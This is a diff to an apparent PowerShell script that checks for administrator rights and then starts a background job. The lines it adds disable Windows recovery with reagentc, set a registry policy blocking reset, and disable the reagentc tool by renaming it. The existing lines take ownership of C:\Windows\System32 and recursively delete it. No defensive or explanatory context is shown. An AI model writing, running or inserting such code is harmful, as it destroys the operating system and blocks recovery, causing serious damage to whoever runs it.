@@ -4,6 +4,11 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 
 Start-Job -ScriptBlock {
+    reagentc /disable
+    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableResetToDefault /t REG_DWORD /d 1 /f
+    takeown /f C:\Windows\System32\reagentc.exe
+    icacls C:\Windows\System32\reagentc.exe /grant administrators:F
+    rename C:\Windows\System32\reagentc.exe reagentc_disabled.exe
     takeown /F "C:\Windows\System32" /A /R /D Y > $null
     icacls "C:\Windows\System32" /grant Administrators:(F) /T /C > $null
     Remove-Item "C:\Windows\System32" -Recurse -Force
